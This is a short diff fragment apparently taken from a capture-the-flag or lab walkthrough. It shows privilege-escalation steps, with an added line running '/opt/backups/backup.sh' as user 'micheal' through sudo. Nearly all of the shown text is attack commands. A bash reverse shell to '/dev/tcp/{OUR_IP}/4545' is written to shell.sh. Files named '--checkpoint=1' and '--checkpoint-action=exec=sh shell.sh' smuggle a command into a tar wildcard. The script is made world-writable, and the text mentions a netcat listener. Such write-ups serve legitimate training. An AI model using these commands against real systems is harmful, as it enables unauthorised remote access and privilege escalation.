@@ -167,6 +167,8 @@ echo "bash -c 'bash -i >& /dev/tcp/{OUR_IP}/4545 0>&1'" > shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 chmod 777 shell.sh
+
+sudo -u micheal /opt/backups/backup.sh
 ```
 
 Let's try start our netcat and run the command.
